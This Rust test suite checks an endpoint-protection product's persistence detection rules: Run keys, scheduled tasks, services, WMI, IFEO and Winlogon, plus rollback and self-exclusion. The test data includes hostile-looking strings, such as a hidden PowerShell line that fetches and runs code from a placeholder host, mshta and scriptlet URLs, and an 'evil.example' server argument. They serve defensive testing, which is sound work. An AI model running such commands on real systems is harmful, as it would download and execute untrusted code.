//! PS-xx persistence family: fixture replays (positive + benign per rule),
//! Audit vs Protect actions, PS-15 rollback, de-duplication, Kestrel
//! self-exclusion and robustness. Resolver unit tests live in
//! `src/families/autorun.rs`.

mod common;
use common::*;
use kestrel_common::*;
use kestrel_detect::*;

const SID: &str = "S-1-5-21-1111-2222-3333-1001";

fn run(name: &str, policy: Policy) -> Vec<Output> {
    let mut e = engine(policy);
    replay(&mut e, &fixture(name))
}

fn ps(out: &[Output]) -> Vec<&Detection> {
    alerts(out)
        .into_iter()
        .filter(|d| d.alert.rule_id.starts_with("PS-"))
        .collect()
}

fn ps_ids(out: &[Output]) -> Vec<String> {
    ps(out).iter().map(|d| d.alert.rule_id.clone()).collect()
}

/// (kind, location, value_name, restore_data) of every RemoveAutorun.
fn removals(
    actions: &[ResponseAction],
) -> Vec<(AutorunKind, String, Option<String>, Option<String>)> {
    actions
        .iter()
        .filter_map(|a| match a {
            ResponseAction::RemoveAutorun {
                kind,
                location,
                value_name,
                restore_data,
            } => Some((
                *kind,
                location.clone(),
                value_name.clone(),
                restore_data.clone(),
            )),
            _ => None,
        })
        .collect()
}

fn quarantined(actions: &[ResponseAction]) -> Vec<String> {
    actions
        .iter()
        .filter_map(|a| match a {
            ResponseAction::QuarantineFile { path, .. } => Some(path.clone()),
            _ => None,
        })
        .collect()
}

fn reg(ts: i64, guid: &str, pid: u32, key: &str, value: &str, data: &str) -> Event {
    ev(
        ts,
        guid,
        pid,
        EventData::RegistrySet {
            attribution: Default::default(),
            target: None,
            key: key.into(),
            value_name: value.into(),
            data: Some(data.into()),
            op: RegistryOp::Set,
        },
    )
}

fn run_key() -> String {
    format!(r"HKU\{SID}\Software\Microsoft\Windows\CurrentVersion\Run")
}

fn unsigned_user_proc(e: &mut Engine, guid: &str, pid: u32, image: &str) {
    e.process(&start(
        0,
        guid,
        pid,
        image,
        image,
        None,
        SignatureState::Unsigned,
        None,
    ));
}

// ---------------------------------------------------------------- catalog

#[test]
fn catalog_has_ps_family() {
    let c = Engine::catalog();
    let ps: Vec<&RuleMeta> = c.iter().filter(|m| m.id.starts_with("PS-")).collect();
    let ids: Vec<&str> = ps.iter().map(|m| m.id.as_str()).collect();
    assert_eq!(
        ids,
        [
            "PS-01", "PS-02", "PS-03", "PS-04", "PS-05", "PS-07", "PS-08", "PS-09", "PS-10",
            "PS-11", "PS-15"
        ]
    );
    for m in &ps {
        assert_eq!(m.category, RuleCategory::Persistence, "{}", m.id);
        assert!(!m.attack.is_empty() && !m.references.is_empty(), "{}", m.id);
        assert!(
            !m.false_positives.is_empty() && !m.protect_action.is_empty(),
            "{}",
            m.id
        );
        let audit = ["PS-01", "PS-04", "PS-05", "PS-11"].contains(&m.id.as_str());
        assert_eq!(m.protect_day_one, !audit, "{}", m.id);
        assert_eq!(
            m.default_mode,
            if audit {
                RuleMode::Audit
            } else {
                RuleMode::Protect
            },
            "{}",
            m.id
        );
    }
}

// ---------------------------------------------------------------- PS-01

#[test]
fn ps01_run_key_to_dropped_unsigned_payload() {
    let out = run("ps_run_key.jsonl", Policy::default());
    assert_eq!(ps_ids(&out), ["PS-01"], "{}", dump(&out));
    let d = ps(&out)[0];
    assert_eq!(d.alert.mode, RuleMode::Audit);
    assert_eq!(d.alert.severity, Severity::High);
    assert!(d.actions.is_empty());
    assert!(d.alert.summary.contains("WinSvc") && d.alert.summary.contains("created minutes ago"));

    let out = run("ps_run_key.jsonl", policy_all(RuleMode::Protect));
    let d = first(&out, "PS-01");
    assert_eq!(
        removals(&d.actions),
        [(
            AutorunKind::RegistryValue,
            run_key(),
            Some("WinSvc".into()),
            None
        )]
    );
    assert_eq!(
        quarantined(&d.actions),
        [r"C:\Users\alice\AppData\Roaming\WinSvc\winsvc.exe"]
    );
    // payload == writer: one tree kill, no separate payload kill
    assert_eq!(kills(&d.actions), [("winsvc".to_string(), true)]);
    // the PS hit already removes it: no PS-15 duplicate
    assert!(
        !ps_ids(&out).contains(&"PS-15".to_string()),
        "{}",
        dump(&out)
    );
}

#[test]
fn ps01_benign_per_user_apps() {
    for pol in [Policy::default(), policy_all(RuleMode::Protect)] {
        let out = run("ps_run_key_benign.jsonl", pol);
        assert!(ps(&out).is_empty(), "{}", dump(&out));
    }
}

#[test]
fn ps01_unknown_signature_is_alert_only_and_hkcu_long_form() {
    let mut e = engine(policy_all(RuleMode::Protect));
    unsigned_user_proc(&mut e, "w", 10, r"C:\Users\alice\AppData\Local\Temp\w.exe");
    // payload never seen running: signature unknown → no actions
    let out = e.process(&reg(
        5,
        "w",
        10,
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
        "x",
        r"%APPDATA%\x\x.exe",
    ));
    let d = first(&out, "PS-01");
    assert!(d.actions.is_empty(), "{}", dump(&out));
    assert!(d.alert.summary.contains(r"\AppData\Roaming\x\x.exe"));
    // Program Files payload: nothing
    let out = e.process(&reg(
        6,
        "w",
        10,
        &run_key(),
        "y",
        r#""C:\Program Files\Y\y.exe""#,
    ));
    assert!(ps(&out).is_empty());
    // deletions are not autoruns
    let out = e.process(&ev(
        7,
        "w",
        10,
        EventData::RegistrySet {
            attribution: Default::default(),
            target: None,
            key: run_key(),
            value_name: "z".into(),
            data: None,
            op: RegistryOp::DeleteValue,
        },
    ));
    assert!(ps(&out).is_empty());
}

// ---------------------------------------------------------------- PS-02

#[test]
fn ps02_lolbin_autoruns() {
    let out = run("ps_lolbin_autorun.jsonl", Policy::default());
    assert_eq!(ps_ids(&out), ["PS-02", "PS-02", "PS-02"], "{}", dump(&out));
    let hits = ps(&out);
    assert!(hits.iter().all(|d| d.alert.mode == RuleMode::Protect));
    // cmd /c start "" powershell -w hidden -enc …
    let d = hits[0];
    assert_eq!(d.alert.severity, Severity::Critical);
    assert!(
        d.alert.summary.contains("encoded command")
            && d.alert.summary.contains("cmd.exe → powershell.exe")
    );
    assert_eq!(
        removals(&d.actions),
        [(
            AutorunKind::RegistryValue,
            run_key(),
            Some("WindowsUpdater".into()),
            None
        )]
    );
    assert_eq!(kills(&d.actions), [("ps-clickfix".to_string(), true)]);
    // mshta URL in a scheduled task
    let d = hits[1];
    assert_eq!(
        removals(&d.actions),
        [(
            AutorunKind::ScheduledTask,
            r"\OneDriveSyncCheck".into(),
            None,
            None
        )]
    );
    assert!(d.alert.summary.contains("https://cdn-check.top/a.hta"));
    // wscript on a user-folder script: the script is quarantined
    let d = hits[2];
    assert_eq!(
        quarantined(&d.actions),
        [r"C:\Users\alice\AppData\Roaming\Init\run.js"]
    );
}

#[test]
fn ps02_benign_logon_script_and_signed_rmm() {
    for pol in [Policy::default(), policy_all(RuleMode::Protect)] {
        let out = run("ps_lolbin_autorun_benign.jsonl", pol);
        // NETLOGON logon script and a plain Program Files PowerShell task: nothing
        assert_eq!(ps_ids(&out), ["PS-02"], "{}", dump(&out));
        let d = ps(&out)[0];
        assert!(d.alert.summary.contains("signed management tool"));
        assert!(d.actions.is_empty(), "signed RMM writer → alert only");
    }
}

// ---------------------------------------------------------------- PS-03

#[test]
fn ps03_startup_drop() {
    let out = run("ps_startup_drop.jsonl", Policy::default());
    let hits = ps(&out);
    let vbs = hits
        .iter()
        .find(|d| d.alert.rule_id == "PS-03" && d.alert.summary.contains("WindowsUpdate.vbs"))
        .expect("vbs hit");
    assert_eq!(vbs.alert.severity, Severity::High);
    assert_eq!(removals(&vbs.actions)[0].0, AutorunKind::StartupFile);
    assert_eq!(kills(&vbs.actions), [("dropper".to_string(), true)]);
    assert!(
        quarantined(&vbs.actions).is_empty(),
        "startup file is moved by RemoveAutorun"
    );
    let lnk = hits
        .iter()
        .find(|d| d.alert.rule_id == "PS-03" && d.alert.summary.contains("Updater.lnk"))
        .expect("lnk hit");
    assert_eq!(lnk.alert.severity, Severity::Medium);
    assert!(lnk.actions.is_empty(), "shortcuts are alert only");
    // …but the dropper's tree was already killed, so PS-15 removes the shortcut too
    let rb = first(&out, "PS-15");
    assert!(removals(&rb.actions)[0]
        .1
        .ends_with(r"\Startup\Updater.lnk"));
}

#[test]
fn ps03_benign() {
    for pol in [Policy::default(), policy_all(RuleMode::Protect)] {
        let out = run("ps_startup_drop_benign.jsonl", pol);
        assert!(ps(&out).is_empty(), "{}", dump(&out));
    }
}

// ---------------------------------------------------------------- PS-04

#[test]
fn ps04_startup_redirection() {
    let out = run("ps_startup_redirect.jsonl", Policy::default());
    let d = first(&out, "PS-04");
    assert_eq!(
        (d.alert.mode, d.alert.severity),
        (RuleMode::Audit, Severity::High)
    );
    assert!(d.actions.is_empty());
    let out = run("ps_startup_redirect.jsonl", policy_all(RuleMode::Protect));
    let d = first(&out, "PS-04");
    let r = removals(&d.actions);
    assert_eq!(r[0].2.as_deref(), Some("Startup"));
    assert_eq!(
        r[0].3.as_deref(),
        Some(r"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
    );
    assert_eq!(kills(&d.actions), [("ps".to_string(), true)]);
}

#[test]
fn ps04_benign() {
    for pol in [Policy::default(), policy_all(RuleMode::Protect)] {
        let out = run("ps_startup_redirect_benign.jsonl", pol);
        assert!(ps(&out).is_empty(), "{}", dump(&out));
    }
}

// ---------------------------------------------------------------- PS-05

#[test]
fn ps05_task_with_untrusted_action() {
    let out = run("ps_task.jsonl", Policy::default());
    assert_eq!(ps_ids(&out), ["PS-05"], "{}", dump(&out));
    let d = ps(&out)[0];
    assert_eq!(
        (d.alert.mode, d.alert.severity),
        (RuleMode::Audit, Severity::High)
    );
    assert!(d.alert.summary.contains("hidden task"));
    assert!(d.actions.is_empty());

    let out = run("ps_task.jsonl", policy_all(RuleMode::Protect));
    let d = first(&out, "PS-05");
    assert_eq!(
        removals(&d.actions),
        [(
            AutorunKind::ScheduledTask,
            r"\SyncHostUpdate".into(),
            None,
            None
        )]
    );
    assert_eq!(
        quarantined(&d.actions),
        [r"C:\Users\alice\AppData\Local\SyncHost\synchost.exe"]
    );
    assert_eq!(
        kills(&d.actions),
        [
            ("synchost".to_string(), false),
            ("loader".to_string(), true)
        ]
    );
}

#[test]
fn ps05_benign_updaters() {
    for pol in [Policy::default(), policy_all(RuleMode::Protect)] {
        let out = run("ps_task_benign.jsonl", pol);
        assert!(ps(&out).is_empty(), "{}", dump(&out));
    }
}

// ---------------------------------------------------------------- PS-07

#[test]
fn ps07_service_installs() {
    let out = run("ps_service.jsonl", Policy::default());
    let hits: Vec<&Detection> = ps(&out)
        .into_iter()
        .filter(|d| d.alert.rule_id == "PS-07")
        .collect();
    assert_eq!(hits.len(), 2, "{}", dump(&out));
    let user_path = hits[0];
    assert_eq!(user_path.alert.mode, RuleMode::Protect);
    assert_eq!(
        removals(&user_path.actions),
        [(AutorunKind::Service, "WinDefendUpd".into(), None, None)]
    );
    // V-H4: the payload path is attacker text in a shared folder the
    // installer was not seen creating, so it is not quarantined (the service
    // is still disabled and the installer killed).
    assert!(
        quarantined(&user_path.actions).is_empty(),
        "{:?}",
        user_path.actions
    );
    assert_eq!(kills(&user_path.actions), [("inst".to_string(), true)]);
    // smbexec-style cmd wrapper, creator unknown: disable only — no kill of
    // services.exe and no quarantine of a path with an unexpanded %USERNAME%
    let smb = hits[1];
    assert!(smb.alert.summary.contains("wraps cmd.exe"));
    assert_eq!(removals(&smb.actions)[0].1, "BTOBTO");
    assert!(kills(&smb.actions).is_empty() && quarantined(&smb.actions).is_empty());
}

#[test]
fn ps07_benign_and_never_kestrel() {
    for pol in [Policy::default(), policy_all(RuleMode::Protect)] {
        let out = run("ps_service_benign.jsonl", pol);
        // Lab 2026-10-21: Kestrel's service *name* on another binary
        // (a binary in the Public profile) is alerted now (only Kestrel's real
        // install is silent); everything else in the fixture stays benign,
        // and Kestrel's service is never a removal target.
        for d in ps(&out) {
            assert_eq!(d.alert.rule_id, "PS-07", "{}", dump(&out));
            assert!(d.alert.summary.contains("KestrelAgent"), "{}", dump(&out));
        }
        assert!(!ps(&out).is_empty(), "{}", dump(&out));
        for d in alerts(&out) {
            for a in &d.actions {
                if let ResponseAction::RemoveAutorun { location, .. } = a {
                    assert!(
                        !location.to_ascii_lowercase().contains("kestrelagent"),
                        "{}",
                        dump(&out)
                    );
                }
            }
        }
    }
}

// ---------------------------------------------------------------- PS-08

#[test]
fn ps08_wmi_subscription() {
    let out = run("ps_wmi.jsonl", Policy::default());
    assert_eq!(ps_ids(&out), ["PS-08", "PS-08"], "{}", dump(&out));
    let tooling = ps(&out)[0];
    assert!(tooling.alert.summary.contains("wmic.exe") && tooling.actions.is_empty());
    let sub = ps(&out)[1];
    assert_eq!(sub.alert.severity, Severity::Critical);
    assert_eq!(
        removals(&sub.actions),
        [(AutorunKind::WmiSubscription, "Updater".into(), None, None)]
    );
    assert!(
        kills(&sub.actions).is_empty(),
        "WmiPrvSE stands in for an unknown creator"
    );
}

#[test]
fn ps08_benign() {
    let out = run("ps_wmi_benign.jsonl", Policy::default());
    // the SCM Event Log pair is ignored; a log-file consumer is alert only
    assert_eq!(ps_ids(&out), ["PS-08"], "{}", dump(&out));
    let d = ps(&out)[0];
    assert!(d.alert.summary.contains("HPHealthLog"));
    assert_eq!(d.alert.severity, Severity::Medium);
    assert!(d.actions.is_empty());
}

// ---------------------------------------------------------------- PS-09

#[test]
fn ps09_ifeo_and_silent_exit() {
    let out = run("ps_ifeo.jsonl", Policy::default());
    assert_eq!(ps_ids(&out), ["PS-09", "PS-09"], "{}", dump(&out));
    let sethc = ps(&out)[0];
    assert_eq!(sethc.alert.severity, Severity::Critical);
    assert!(sethc.alert.summary.contains("accessibility"));
    assert_eq!(removals(&sethc.actions)[0].2.as_deref(), Some("Debugger"));
    assert!(
        quarantined(&sethc.actions).is_empty(),
        "never quarantine System32 cmd.exe"
    );
    assert_eq!(kills(&sethc.actions), [("ps".to_string(), true)]);
    let spe = ps(&out)[1];
    assert_eq!(spe.alert.severity, Severity::Critical);
    assert!(spe.alert.summary.contains("GlobalFlag"));
    assert_eq!(
        removals(&spe.actions)[0].2.as_deref(),
        Some("MonitorProcess")
    );
    assert_eq!(
        quarantined(&spe.actions),
        [r"C:\Users\alice\AppData\Roaming\m\mon.exe"]
    );
}

#[test]
fn ps09_benign_procexp_and_lsass_left_to_cd07() {
    for pol in [Policy::default(), policy_all(RuleMode::Protect)] {
        let out = run("ps_ifeo_benign.jsonl", pol);
        assert!(ps(&out).is_empty(), "{}", dump(&out));
    }
}

// ---------------------------------------------------------------- PS-10

#[test]
fn ps10_winlogon_and_bootexecute_restore_defaults() {
    let out = run("ps_winlogon.jsonl", Policy::default());
    assert_eq!(ps_ids(&out), ["PS-10", "PS-10", "PS-10"], "{}", dump(&out));
    let restores: Vec<(Option<String>, Option<String>)> = ps(&out)
        .iter()
        .map(|d| {
            let r = removals(&d.actions);
            (r[0].2.clone(), r[0].3.clone())
        })
        .collect();
    assert_eq!(
        restores,
        [
            (
                Some("Userinit".into()),
                Some(r"C:\Windows\system32\userinit.exe,".into())
            ),
            (Some("Shell".into()), Some("explorer.exe".into())),
            (
                Some("BootExecute".into()),
                Some("autocheck autochk *".into())
            ),
        ]
    );
    let userinit = ps(&out)[0];
    // V-H4: C:\Users\Public is not the writer's profile and the writer was
    // not seen creating the file: no quarantine of an attacker-named path.
    assert!(
        quarantined(&userinit.actions).is_empty(),
        "{:?}",
        userinit.actions
    );
    assert_eq!(kills(&userinit.actions), [("evil".to_string(), true)]);
}

#[test]
fn ps10_benign_defaults_and_appinit_alert_only() {
    let out = run("ps_winlogon_benign.jsonl", policy_all(RuleMode::Protect));
    assert_eq!(ps_ids(&out), ["PS-10"], "{}", dump(&out));
    let d = ps(&out)[0];
    assert!(d.alert.summary.contains("AppInit_DLLs"));
    assert!(d.actions.is_empty());
}

#[test]
fn ps10_hkcu_shell_override_is_deleted_not_restored() {
    let mut e = engine(Policy::default());
    unsigned_user_proc(&mut e, "w", 10, r"C:\Users\alice\AppData\Local\Temp\w.exe");
    let key = format!(r"HKU\{SID}\Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
    let out = e.process(&reg(
        5,
        "w",
        10,
        &key,
        "Shell",
        r"C:\Users\alice\AppData\Roaming\s.exe",
    ));
    let d = first(&out, "PS-10");
    assert_eq!(
        removals(&d.actions),
        [(AutorunKind::RegistryValue, key, Some("Shell".into()), None)]
    );
}

// ---------------------------------------------------------------- PS-11

#[test]
fn ps11_com_hijack() {
    let out = run("ps_com_hijack.jsonl", policy_all(RuleMode::Protect));
    assert_eq!(ps_ids(&out), ["PS-11", "PS-11"], "{}", dump(&out));
    let inproc = ps(&out)[0];
    assert_eq!(inproc.alert.severity, Severity::High);
    assert!(inproc.alert.summary.contains("msvcp_win.dll"));
    // DLL signature unknown → alert only even in Protect
    assert!(inproc.actions.is_empty());
    let scriptlet = ps(&out)[1];
    assert!(scriptlet
        .alert
        .summary
        .contains("https://cdn-check.top/x.sct"));
}

#[test]
fn ps11_benign_onedrive_shell_extension() {
    for pol in [Policy::default(), policy_all(RuleMode::Protect)] {
        let out = run("ps_com_hijack_benign.jsonl", pol);
        assert!(ps(&out).is_empty(), "{}", dump(&out));
    }
}

// ---------------------------------------------------------------- PS-15

#[test]
fn ps15_rollback_after_strong_kill() {
    let out = run("ps_rollback.jsonl", Policy::default());
    let st02 = first(&out, "ST-02");
    assert!(kills(&st02.actions).contains(&("vidar".to_string(), true)));
    let rb: Vec<&Detection> = ps(&out)
        .into_iter()
        .filter(|d| d.alert.rule_id == "PS-15")
        .collect();
    assert_eq!(rb.len(), 2, "{}", dump(&out));
    // both earlier autoruns (PS-01 / PS-05 only audited them)
    let r = removals(&rb[0].actions);
    assert_eq!(
        r,
        [
            (
                AutorunKind::RegistryValue,
                run_key(),
                Some("NeoHub".into()),
                None
            ),
            (
                AutorunKind::ScheduledTask,
                r"\NeoHubUpdate".into(),
                None,
                None
            ),
        ]
    );
    assert_eq!(
        quarantined(&rb[0].actions),
        [r"C:\Users\alice\AppData\Roaming\NeoHub\neohub.exe"]
    );
    assert!(rb[0].alert.summary.contains("ST-02"));
    // a late RunOnce written by the killed tree is removed as it appears
    assert_eq!(removals(&rb[1].actions)[0].2.as_deref(), Some("NeoHubOnce"));
}

#[test]
fn ps15_needs_a_protect_kill() {
    let mut p = Policy::default();
    p.rules.insert("ST-02".into(), RuleMode::Audit);
    let out = run("ps_rollback.jsonl", p);
    assert!(
        !ps_ids(&out).contains(&"PS-15".to_string()),
        "{}",
        dump(&out)
    );
    // PS-15 itself in Audit: alert, no actions
    let mut p = Policy::default();
    p.rules.insert("PS-15".into(), RuleMode::Audit);
    let out = run("ps_rollback.jsonl", p);
    let d = first(&out, "PS-15");
    assert_eq!(d.alert.mode, RuleMode::Audit);
    assert!(d.actions.is_empty());
}

// ---------------------------------------------------------------- de-dup, robustness

#[test]
fn dedup_per_autorun_location() {
    let mut e = engine(Policy::default());
    unsigned_user_proc(&mut e, "w", 10, r"C:\Users\alice\AppData\Local\Temp\w.exe");
    let cmd = "powershell -w hidden -c iex(irm https://x.example/a)";
    assert_eq!(
        ps_ids(&e.process(&reg(1, "w", 10, &run_key(), "a", cmd))),
        ["PS-02"]
    );
    // NEW-1: the same value set again after its removal was ordered is a
    // re-plant: one more alert, then silence for the de-dup window.
    let out = e.process(&reg(2, "w", 10, &run_key(), "a", cmd));
    assert_eq!(ps_ids(&out), ["PS-02"]);
    assert!(
        first(&out, "PS-02").alert.summary.contains("came back"),
        "{}",
        dump(&out)
    );
    assert!(
        ps_ids(&e.process(&reg(3, "w", 10, &run_key(), "A", cmd))).is_empty(),
        "case-insensitive"
    );
    assert_eq!(
        ps_ids(&e.process(&reg(4, "w", 10, &run_key(), "b", cmd))),
        ["PS-02"]
    );
}

#[test]
fn malformed_input_never_panics() {
    let mut e = engine(policy_all(RuleMode::Protect));
    unsigned_user_proc(&mut e, "w", 10, r"C:\Users\alice\AppData\Local\Temp\w.exe");
    let long = "A".repeat(200_000);
    let datas = [
        "",
        "\"",
        "%",
        "%%%%",
        "cmd /c",
        "powershell -enc",
        "powershell -enc ####",
        "rundll32 ,",
        "\u{0}\u{0}",
        "mshta",
        "regsvr32 /i:",
        "conhost --headless",
        "forfiles /c",
        "\u{2013}c x",
        long.as_str(),
    ];
    let keys = [
        run_key(),
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon".into(),
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\x.exe"
            .into(),
        r"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager".into(),
        format!(r"HKU\{SID}_Classes\CLSID\{{x}}\InprocServer32"),
        r"HKU\".into(),
        "".into(),
        r"HKLM\SYSTEM\CurrentControlSet\Services\x".into(),
    ];
    let mut ts = 1;
    for k in &keys {
        for v in [
            "",
            "Userinit",
            "Shell",
            "Debugger",
            "BootExecute",
            "ImagePath",
            "x",
        ] {
            for d in &datas {
                ts += 1;
                let _ = e.process(&reg(ts, "w", 10, k, v, d));
            }
        }
    }
    for d in &datas {
        ts += 1;
        let _ = e.process(&ev(
            ts,
            "w",
            10,
            EventData::TaskRegistered(TaskChange {
                attribution: Default::default(),
                name: (*d).into(),
                actions: vec![(*d).into()],
                hidden: true,
                triggers: vec!["logon".into()],
                ..Default::default()
            }),
        ));
        let _ = e.process(&ev(
            ts,
            "w",
            10,
            EventData::ServiceInstalled(ServiceInstall {
                attribution: Default::default(),
                name: (*d).into(),
                image_path: (*d).into(),
                ..Default::default()
            }),
        ));
        let _ = e.process(&ev(
            ts,
            "w",
            10,
            EventData::WmiSubscription(WmiBinding {
                attribution: Default::default(),
                namespace: "x".into(),
                filter: (*d).into(),
                consumer: format!("CommandLineEventConsumer=\"{d}"),
            }),
        ));
    }
}

#[test]
fn state_is_bounded_under_flood() {
    let mut e = engine(Policy::default());
    let started = std::time::Instant::now();
    for i in 0..3000u32 {
        let g = format!("p{i}");
        e.process(&start(
            i as i64,
            &g,
            1000 + i,
            r"C:\Users\alice\AppData\Local\Temp\f.exe",
            "f.exe",
            None,
            SignatureState::Unsigned,
            None,
        ));
        for j in 0..3 {
            e.process(&ev(
                i as i64,
                &g,
                1000 + i,
                EventData::FileAccess {
                    path: format!(r"C:\Users\alice\AppData\Roaming\d{i}\f{j}.exe"),
                    op: FileOp::Create,
                },
            ));
        }
        e.process(&reg(
            i as i64,
            &g,
            1000 + i,
            &run_key(),
            &format!("v{i}"),
            &format!(r"C:\Users\alice\AppData\Roaming\d{i}\f0.exe"),
        ));
        if i % 100 == 0 {
            e.tick(T0 + i as i64);
        }
    }
    assert!(started.elapsed().as_secs() < 60);
}

/// Fresh-install lab 2026-10-21 (1.1.3, timing-dependent): the SCM record
/// of Kestrel's own service install raised PS-07 ("An unidentified process
/// installed the service \"Kestrel EDR Agent\" …"). Kestrel's own service
/// (exact name + the running agent's image) and the tray's HKLM Run value
/// (exact value name + kestrel-tray.exe next to the agent) raise nothing,
/// in any mode, from any rule, Sigma included.
#[test]
fn kestrel_own_install_raises_nothing() {
    for mode in [RuleMode::Audit, RuleMode::Protect] {
        let mut e = engine(policy_all(mode));
        // As in the lab: the (unsigned) agent is already running.
        e.process(&start(
            0,
            "agent",
            900,
            AGENT,
            "kestrel-agent.exe service",
            None,
            SignatureState::Unsigned,
            None,
        ));
        let out = replay(&mut e, &fixture("ps_kestrel_own_install.jsonl"));
        assert!(alerts(&out).is_empty(), "{mode:?}: {}", dump(&out));
        assert!(standalone(&out).is_empty(), "{mode:?}: {}", dump(&out));
    }
}

/// Kestrel's name on another binary, the agent binary under another
/// service name, and a `KestrelTray` Run value pointing elsewhere are
/// judged like anything else.
#[test]
fn kestrel_impostors_still_alert() {
    let fx = fixture("ps_kestrel_impostor.jsonl");
    // The agent binary is unsigned (as in the lab), and known to the
    // process table: a service running it under another name is weak-PS-07.
    let agent_start = start(
        0,
        "agent",
        900,
        AGENT,
        "kestrel-agent.exe service",
        None,
        SignatureState::Unsigned,
        None,
    );
    let mut internal = fx[0].clone();
    if let EventData::ServiceInstalled(si) = &mut internal.data {
        si.name = "KestrelAgent".into();
    }
    let cases = [
        (fx[0].clone(), "PS-07"),
        (internal, "PS-07"),
        (fx[1].clone(), "PS-07"),
        (fx[2].clone(), "PS-01"),
    ];
    for (i, (ev, want)) in cases.into_iter().enumerate() {
        let mut e = engine(policy_all(RuleMode::Protect));
        e.process(&agent_start);
        let out = e.process(&ev);
        if i < 2 {
            // Kestrel's service name: alerted, but never a removal target.
            let acts: Vec<ResponseAction> = alerts(&out)
                .iter()
                .flat_map(|d| d.actions.clone())
                .collect();
            assert!(removals(&acts).is_empty(), "event {i}: {}", dump(&out));
        }
        let ids = ps_ids(&out);
        assert!(ids.contains(&want.to_string()), "event {i}: {}", dump(&out));
    }
    // Same name and binary but another argument, or a HKCU Run value: not
    // Kestrel's install either.
    let mut e = engine(policy_all(RuleMode::Audit));
    e.process(&agent_start);
    let mut s = fx[0].clone();
    if let EventData::ServiceInstalled(si) = &mut s.data {
        si.image_path = format!(r#""{AGENT}" run --server https://evil.example"#);
    }
    assert!(!alerts(&e.process(&s)).is_empty());
    let mut r = fixture("ps_kestrel_own_install.jsonl")[2].clone();
    if let EventData::RegistrySet { key, data, .. } = &mut r.data {
        *key = format!(r"HKU\{SID}\Software\Microsoft\Windows\CurrentVersion\Run");
        *data = Some(r#""C:\Users\alice\AppData\Local\Temp\kestrel-tray.exe" --background"#.into());
    }
    assert!(!ps_ids(&e.process(&r)).is_empty());
}
